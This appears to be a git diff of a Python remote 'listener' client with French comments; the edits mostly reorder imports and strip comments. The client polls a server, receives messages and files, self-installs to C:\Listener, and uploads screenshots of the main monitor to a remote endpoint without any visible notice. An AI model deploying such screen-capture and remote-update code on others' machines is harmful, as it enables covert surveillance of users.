@@ -1,51 +1,43 @@
-import requests
-import time
-import json
-import os
-import platform
 import sys
-from datetime import datetime
-import random
-import string
-import subprocess
-import tempfile
-from pathlib import Path
-from tkinter import *
-import tkinter as tk
-import os
-import threading
-import textwrap
 import platform
-from mss import mss
-from PIL import Image
-from io import BytesIO
-import base64
 
-# Forcer l'encodage UTF-8 pour la console Windows
+# Forcer l'encodage UTF-8 pour la console Windows (doit être en tout premier)
 if platform.system() == "Windows":
     if sys.stdout is not None:
         sys.stdout.reconfigure(encoding='utf-8')
     if sys.stderr is not None:
         sys.stderr.reconfigure(encoding='utf-8')
 
-import sys
+import requests
+import time
+import json
+import os
+import subprocess
+import tempfile
+from pathlib import Path
+from tkinter import *
+import tkinter as tk
+import threading
+import textwrap
+from datetime import datetime
+import random
+import string
+from mss import mss
+from PIL import Image
+from io import BytesIO
+import base64
 
 def resource_path(relative_path):
     """Retourne le chemin correct pour les fichiers bundlés dans PyInstaller"""
     try:
-        # PyInstaller extrait les fichiers dans un dossier temporaire
         base_path = sys._MEIPASS
     except AttributeError:
-        # Si on exécute le script .py directement
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
 
 # ========================================
 # CONFIGURATION
 # ========================================
-# f = open(resource_path('C:\ProgramData\VAR\id_pc.txt'), 'r')
-# pc_id = f.read().strip()
-# f.close()
 pc_id = platform.node()
 
 CHECK_INTERVAL = 2
@@ -65,14 +57,11 @@ def popup(msg):
         root = tk.Tk()
         root.wm_attributes("-topmost", True)
 
-        # Taille de base de la fenêtre
         width, height = 600, 400
         root.geometry(f"{width}x{height}")
 
-        # 1) Déterminer la taille de police en fonction de la longueur
         n = len(msg)
 
-        # seuils à ajuster selon ton besoin
         if n < 80:
             font_size = 30
             use_scroll = False
@@ -84,19 +73,17 @@ def popup(msg):
             use_scroll = True
 
         if not use_scroll:
-            # 2) Label simple, texte centré, wrap sur la largeur de la fenêtre
             l = tk.Label(
                 root,
                 text=msg,
                 padx=40,
                 pady=40,
-                wraplength=width - 80,  # pour éviter que ça dépasse
+                wraplength=width - 80,
                 justify="center"
             )
             l.config(font=("Arial", font_size))
             l.pack(expand=True, fill="both")
         else:
-            # 3) Beaucoup de texte : Text + Scrollbar
             frame = tk.Frame(root)
             frame.pack(expand=True, fill="both", padx=20, pady=20)
 
@@ -111,11 +98,9 @@ def popup(msg):
             text.pack(side="left", expand=True, fill="both")
             scroll.pack(side="right", fill="y")
 
-            # on peut éventuellement couper manuellement en lignes
-            # pour éviter les lignes trop longues :
             wrapped = "\n".join(textwrap.wrap(msg, width=90))
             text.insert("1.0", wrapped)
-            text.config(state="disabled")  # lecture seule
+            text.config(state="disabled")
 
         root.mainloop()
 
@@ -227,26 +212,20 @@ class AutoUpdater:
         """Applique la mise à jour"""
         try:
             if getattr(sys, 'frozen', False):
-                # chemin actuel de l'exe lancé
                 current_exe = os.path.abspath(sys.argv[0])
             else:
                 self.log("Mode dev, pas d'update", "WARNING")
                 return False
 
-            # OPTIONNEL mais pratique : forcer un chemin "officiel"
-            # par exemple C:\Listener\listener.exe
             official_dir = r"C:\Listener"
             official_exe = os.path.join(official_dir, os.path.basename(current_exe))
 
             if not os.path.exists(official_dir):
                 os.makedirs(official_dir, exist_ok=True)
 
-            # Si l'exe actuel n'est pas déjà dans le dossier officiel,
-            # on copie pour que toutes les futures MAJ se fassent là
             if os.path.abspath(current_exe) != os.path.abspath(official_exe):
                 self.log(f"Deplacement vers {official_exe}", "UPDATE")
                 try:
-                    # copier l'exe actuel dans le dossier officiel
                     import shutil
                     shutil.copy2(current_exe, official_exe)
                     current_exe = official_exe
@@ -342,7 +321,6 @@ class AutonomousListener:
             if not files:
                 return
             
-            # Dossier de destination : Bureau/SysGuardian/
             if platform.system() == "Windows":
                 desktop = Path(os.path.join(os.path.expanduser("~"), "Desktop"))
             elif platform.system() == "Darwin":
@@ -361,11 +339,11 @@ class AutonomousListener:
                 with open(dest_path, "wb") as fp:
                     fp.write(data)
                 
-                self.log(f"Fichier sauvegardé : {dest_path}", "SUCCESS")
-                popup(f"Fichier reçu !\n{filename}\n\nSauvegardé dans :\n{dest_path}")
+                self.log(f"Fichier sauvegarde : {dest_path}", "SUCCESS")
+                popup(f"Fichier recu !\n{filename}\n\nSauvegarde dans :\n{dest_path}")
 
         except Exception as e:
-            self.log(f"Erreur récupération fichiers : {e}", "ERROR")
+            self.log(f"Erreur recuperation fichiers : {e}", "ERROR")
 
     def get_messages(self):
         """Récupère tous les messages du Gist"""
@@ -404,13 +382,12 @@ class AutonomousListener:
         try:
             url = f"{SERVER}/api/online?pc_id={pc_id}"
             r = requests.get(url)
-            print(f"réponse du serveur : {r.text}")
+            print(f"reponse du serveur : {r.text}")
         except Exception as e:
             self.log(f"Erreur lecture messages : {e}", "ERROR")
 
     def get_screenshot_bytes_jpeg(self, quality=60):
         sct = mss()
-        # Monitor principal (index 1)
         sct_img = sct.grab(sct.monitors[1])
         img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
         buffer = BytesIO()
@@ -426,7 +403,6 @@ class AutonomousListener:
             requests.post(f"{SERVER}/api/upload_screen", data=data, files=files, timeout=3)
         except Exception as e:
             print("Erreur envoi:", e)
-
 
     def process_message(self, msg, c_type):
         """Traite un message reçu"""
@@ -453,7 +429,6 @@ class AutonomousListener:
         self.log("Appuyez sur Ctrl+C pour arreter", "INFO")
         self.log("=" * 60, "INFO")
 
-        # Vérification initiale des mises à jour
         self.check_for_updates()
 
         consecutive_errors = 0
